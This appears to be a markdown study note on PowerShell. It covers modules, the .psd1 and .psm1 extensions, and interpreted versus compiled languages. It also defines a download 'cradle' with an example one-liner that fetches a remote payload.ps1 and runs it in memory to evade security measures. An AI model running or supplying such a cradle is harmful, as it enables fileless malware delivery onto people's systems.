# PowerShell
- PowerShell is commonly associated with Windows 7 and later versions of the Windows operating system.
- PowerShell is NOT powershell.exe. It is the *System.Management.Automation.dll*
- PowerShell that contains a collection of cmdlets, functions, variables, and other elements that can be reused across multiple scripts or sessions.
- PowerShell Modules are designed to encapsulate and organize specific pieces of functionality in a modular and efficient way.
- PowerShell Extenstion is .psd1 & .psm1
- ```.psd1```: This extension is used for PowerShell Data files. Specifically, it is commonly used for module manifest files. A module manifest is a metadata file that provides information about a PowerShell module, such as its name, version, author, and dependencies. The .psd1 file is written in a format similar to a hashtable with key-value pairs and is used to define various attributes and settings for the module.
- ```.psm1```: This extension is used for PowerShell Script Module files. These are script files that contain PowerShell code, including functions and cmdlets, that are part of a module. When you create a module, you can include one or more .psm1 files to define the actual functionality provided by the module. These script module files are typically where you write the code for the module's cmdlets and functions.
- what is mean of ```Cradle```?
It is a method used for executing PowerShell commands or scripts in a way that may bypass security measures and avoid writing scripts or payloads to disk.\
**Example:**\
```iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')```
>"iex" stands for "Invoke-Expression." It is a cmdlet that allows you to run a string as a PowerShell expression or script. The iex cmdlet takes a string as its argument and then interprets and executes the code contained within that string.

**Note:**
> - PowerShell is an interpreted scripting language. It uses an interpreter to process and execute PowerShell scripts and commands. When you run a PowerShell script or enter PowerShell commands in an interactive session, the PowerShell interpreter reads and executes the code line by line or statement by statement.
> - PowerShell scripts are not compiled into machine code before execution. Instead, they are directly interpreted by the PowerShell runtime environment. This allows for flexibility, ease of debugging, and interactive development. However, it can also result in somewhat slower execution compared to compiled languages.
   
**Compiler Vs Interpreter:**
 > 1. Processing Approach:
        Compiler: Compilers process the entire source code of a program in one go, translating it into machine code or an intermediate representation before execution. The result is an executable file that can be run independently.
        Interpreter: Interpreters process the source code line by line or statement by statement, executing it as they encounter each part of the code.
 > 2. Execution:
        Compiler: The code is executed after the compilation process is complete. There is no need to recompile the code each time it runs, which generally results in faster execution.
        Interpreter: Code is executed directly, and there is no separate compilation step. This can lead to slower execution as the source code is repeatedly analyzed and executed.
 > 3. Debugging:
        Compiler: Debugging can be more challenging, as errors are often detected during or after the compilation process, and it may not be immediately obvious where in the source code the problem exists.
        Interpreter: Debugging is often more straightforward, as errors are reported as soon as they are encountered in the code, making it easier to identify the specific location of issues.
 > 4. Portability:
        Compiler: Code compiled with one compiler on a specific platform may not be directly executable on a different platform without recompilation.
        Interpreter: Interpreted code is often more portable, as long as the interpreter is available for the target platform.
 > 5. Examples:
        Compiler: Languages like C, C++, and Rust are typically compiled languages.
        Interpreter: Languages like Python, Ruby, and JavaScript are often interpreted languages.
 > 6. Flexibility:
        Compiler: Compiled code is generally less flexible because it is already translated into machine code or an intermediate form. Modifications require changes to the source code and recompilation.
        Interpreter: Interpreted code is more flexible, as it can be modified and executed interactively without the need for a separate compilation step.
- 
